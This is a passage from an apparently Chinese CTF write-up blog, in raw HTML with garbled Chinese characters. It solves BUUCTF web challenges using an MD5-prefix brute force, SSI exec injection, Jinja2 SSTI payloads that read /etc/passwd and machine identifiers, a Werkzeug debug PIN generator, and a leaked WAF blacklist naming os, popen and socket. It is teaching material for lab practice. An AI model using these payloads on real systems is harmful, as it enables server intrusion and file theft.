</span></span><span style=display:flex><span>		$random <span style=color:#f92672>=</span> $chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)];<span style=color:#75715e>//Random 5 times
</span></span></span><span style=display:flex><span>		$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>uniqid</span>()<span style=color:#f92672>.</span>$random;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>sha1</span>($content); 
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#66d9ef>and</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $admin <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;6d0bc1&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( $admin <span style=color:#f92672>==</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]),<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>6</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span>;
</span></span><span style=display:flex><span>            $file_shtml <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;public/&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>get_hash</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.shtml&#34;</span>;
</span></span><span style=display:flex><span>            $shtml <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($file_shtml, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unable to open file!&#34;</span>);
</span></span><span style=display:flex><span>            $text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h1&gt;Hello,&#39;</span><span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#39;username&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			***&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fwrite</span>($shtml,$text);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fclose</span>($shtml);
</span></span><span style=display:flex><span>            <span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;[!] Header  error ...&#34;</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span>;
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>å…ˆçˆ†ç ´ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># ç›®æ ‡å€¼</span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;6d0bc1&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10000000</span>):
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> str(i)<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>6</span>)  
</span></span><span style=display:flex><span>    hash_md5 <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(password<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hash_md5[:<span style=color:#ae81ff>6</span>] <span style=color:#f92672>==</span> target:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found password: </span><span style=color:#e6db74>{</span>password<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Found password: 2020666</span>
</span></span></code></pre></div><ul><li><p>ç™»å½•æˆåŠŸåï¼Œæœªè¿‡æ»¤çš„<code>$_POST['username']</code>ç›´æ¥å†™å…¥.shtmlæ–‡ä»¶</p></li><li><p>è‹¥æœåŠ¡å™¨å¯ç”¨SSIï¼ˆServer Side Includesï¼‰ï¼Œå¯æ„é€ æ¶æ„ç”¨æˆ·åæ³¨å…¥SSIæŒ‡ä»¤</p><p>æç¤ºï¼š<code>public/2cdabc9bda70f7f3c537f020be9aa2ef02a4db69.shtml</code></p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--#exec cmd=&#34;whoami&#34;--&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--#exec cmd=&#34;ls /&#34;--&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--#exec cmd=&#34;cat ../flag_990c66bf85a09c664f0b6741840499b2&#34;--&gt;</span>
</span></span></code></pre></div><h2 id=gyctf2020flaskapp>[GYCTF2020]FlaskApp</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://29d03887-2e28-449d-97a5-32e18c964cbe.node5.buuoj.cn/console
</span></span></code></pre></div><p>æœ‰å¼¹çª—çš„ï¼Œåº”è¯¥è€ƒå¯Ÿçš„æ˜¯pythonçš„pinå§</p><h3 id=0x01-1>0x01</h3><p>å…ˆå°è¯•ä¸€ä¸‹</p><pre tabindex=0><code>{{1+1}}
e3sxKzF9fQ==
</code></pre><pre tabindex=0><code>{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
e3t7fS5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKVsxMDJdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcGVuJ10oJy9ldGMvcGFzc3dkJykucmVhZCgpfX0NCg==
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh
</span></span></code></pre></div><pre tabindex=0><code>username:flaskweb
</code></pre><pre tabindex=0><code>è·¯å¾„:/usr/local/lib/python3.7/site-packages/flask/app.py
</code></pre><pre tabindex=0><code>{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;/sys/class/net/eth0/address&#39;).read()}}
e3t7fS5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKVsxMDJdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcGVuJ10oJy9zeXMvY2xhc3MvbmV0L2V0aDAvYWRkcmVzcycpLnJlYWQoKX19
12:a3:50:49:14:8e
#macåœ°å€
</code></pre><pre tabindex=0><code>{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;/proc/self/cgroup&#39;).read()}}
e3t7fS5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKVsxMDJdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcGVuJ10oJy9wcm9jL3NlbGYvY2dyb3VwJykucmVhZCgpfX0=
2304f2d299bd73bcfe2a090fa3f07be99553be66d6c89806e71cbaf858fbf7e7
2ba422d5480704d63dbd229aac7073a77b7e06f7c9b017ca337a798ea3146f03
</code></pre><pre tabindex=0><code>{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;/etc/machine-id&#39;).read()}}
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> itertools <span style=color:#f92672>import</span> chain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>probably_public_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;flaskweb&#39;</span>,<span style=color:#75715e>#æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·å</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;flask.app&#39;</span>,<span style=color:#75715e>#modname</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Flask&#39;</span>,<span style=color:#75715e>#getattr(app, &#34;\_\_name__&#34;, app.\_\_class__.\_\_name__)</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;</span>,<span style=color:#75715e>#flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>private_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;20492635935886&#39;</span>,<span style=color:#75715e>#å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;2304f2d299bd73bcfe2a090fa3f07be99553be66d6c89806e71cbaf858fbf7e7&#39;</span><span style=color:#75715e>#æœºå™¨çš„id</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>h <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5()
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> bit <span style=color:#f92672>in</span> chain(probably_public_bits, private_bits):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> bit:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> isinstance(bit, str):
</span></span><span style=display:flex><span>        bit <span style=color:#f92672>=</span> bit<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(bit)
</span></span><span style=display:flex><span>h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cookiesalt&#39;</span>)
</span></span><span style=display:flex><span>cookie_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;__wzd&#39;</span> <span style=color:#f92672>+</span> h<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>20</span>]
</span></span><span style=display:flex><span>num <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> num <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;pinsalt&#39;</span>)
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%09d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> int(h<span style=color:#f92672>.</span>hexdigest(), <span style=color:#ae81ff>16</span>))[:<span style=color:#ae81ff>9</span>]
</span></span><span style=display:flex><span>rv <span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> rv <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> group_size <span style=color:#f92672>in</span> <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(num) <span style=color:#f92672>%</span> group_size <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            rv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>.</span>join(num[x:x <span style=color:#f92672>+</span> group_size]<span style=color:#f92672>.</span>rjust(group_size, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>                          <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(num), group_size))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> num
</span></span><span style=display:flex><span>print(rv)
</span></span></code></pre></div><p>åŸç†éƒ½æ˜¯å¯¹çš„ä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘ä¸å‡ºæ¥</p><h3 id=0x02-1>0x02</h3><p>è¯»å–app.py</p><pre tabindex=0><code>{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;app.py&#39;).read()}}
e3t7fS5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKVsxMDJdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcGVuJ10oJ2FwcC5weScpLnJlYWQoKX19
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request, flash, redirect, url_for, abort
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_wtf <span style=color:#f92672>import</span> FlaskForm
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> wtforms <span style=color:#f92672>import</span> StringField, SubmitField
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> wtforms.validators <span style=color:#f92672>import</span> DataRequired
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_bootstrap <span style=color:#f92672>import</span> Bootstrap
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SECRET_KEY&#39;</span>] <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#39;SECRET_KEY&#39;</span>, <span style=color:#e6db74>&#39;s_e_c_r_e_t_k_e_y&#39;</span>)  <span style=color:#75715e># ä»ç¯å¢ƒå˜é‡ä¸­è¯»å– SECRET_KEY</span>
</span></span><span style=display:flex><span>bootstrap <span style=color:#f92672>=</span> Bootstrap(app)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>NameForm</span>(FlaskForm):
</span></span><span style=display:flex><span>    text <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;BASE64åŠ å¯†&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;æäº¤&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>NameForm1</span>(FlaskForm):
</span></span><span style=display:flex><span>    text <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;BASE64è§£å¯†&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;æäº¤&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>waf</span>(str):
</span></span><span style=display:flex><span>    black_list <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#e6db74>&#34;os&#34;</span>, <span style=color:#e6db74>&#34;system&#34;</span>, <span style=color:#e6db74>&#34;popen&#34;</span>, <span style=color:#e6db74>&#34;import&#34;</span>, <span style=color:#e6db74>&#34;eval&#34;</span>, <span style=color:#e6db74>&#34;chr&#34;</span>, <span style=color:#e6db74>&#34;request&#34;</span>, 
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;subprocess&#34;</span>, <span style=color:#e6db74>&#34;commands&#34;</span>, <span style=color:#e6db74>&#34;socket&#34;</span>, <span style=color:#e6db74>&#34;hex&#34;</span>, <span style=color:#e6db74>&#34;base64&#34;</span>, <span style=color:#e6db74>&#34;*&#34;</span>, <span style=color:#e6db74>&#34;?&#34;</span>
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> black_list:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> x <span style=color:#f92672>in</span> str<span style=color:#f92672>.</span>lower():
</span></span><span style=display:flex><span>            abort(<span style=color:#ae81ff>403</span>)  <span style=color:#75715e># Forbidden</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/hint&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hint</span>():
</span></span><span style=display:flex><span>    txt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;hint.html&#34;</span>, txt<span style=color:#f92672>=</span>txt)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encode</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;text&#39;</span>):
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;text&#34;</span>)
</span></span><span style=display:flex><span>        text_encode <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(text<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ç»“æœ : </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(text_encode)
</span></span><span style=display:flex><span>        flash(tmp)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;encode&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        form <span style=color:#f92672>=</span> NameForm()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, form<span style=color:#f92672>=</span>form, method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;åŠ å¯†&#34;</span>, img<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flask.png&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/decode&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;text&#39;</span>):
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;text&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            text_decode <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(text<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            flash(<span style=color:#e6db74>&#34;æ— æ•ˆçš„ base64 å­—ç¬¦ä¸²&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;decode&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> waf(text_decode):
</span></span><span style=display:flex><span>            flash(<span style=color:#e6db74>&#34;no no no !!&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;decode&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ç»“æœ : </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(text_decode)
</span></span><span style=display:flex><span>        flash(tmp)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;decode&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        form <span style=color:#f92672>=</span> NameForm1()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, form<span style=color:#f92672>=</span>form, method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;è§£å¯†&#34;</span>, img<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flask1.png&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&lt;name&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>not_found</span>(name):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;404.html&#34;</span>, name<span style=color:#f92672>=</span>name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>, debug<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>{<span style=color:#f92672>%</span> <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> []<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__() <span style=color:#f92672>%</span>}{<span style=color:#f92672>%</span> <span style=color:#66d9ef>if</span> c<span style=color:#f92672>.</span>__name__<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;catch_warnings&#39;</span> <span style=color:#f92672>%</span>}{{ c<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;__builtins__&#39;</span>]<span style=color:#f92672>.</span>open(<span style=color:#e6db74>&#39;txt.galf_eht_si_siht/&#39;</span>[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>],<span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read() }}{<span style=color:#f92672>%</span> endif <span style=color:#f92672>%</span>}{<span style=color:#f92672>%</span> endfor <span style=color:#f92672>%</span>}
</span></span></code></pre></div><h2 id=wustctf2020é¢œå€¼æˆç»©æŸ¥è¯¢>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>å‚è€ƒ2019å¹´çš„æå®¢å¤§æŒ‘æˆ˜</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge: [WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://5cdb17da-f3cb-48d7-9db4-88e23596213f.node5.buuoj.cn:81/?stunum=&#39;</span>
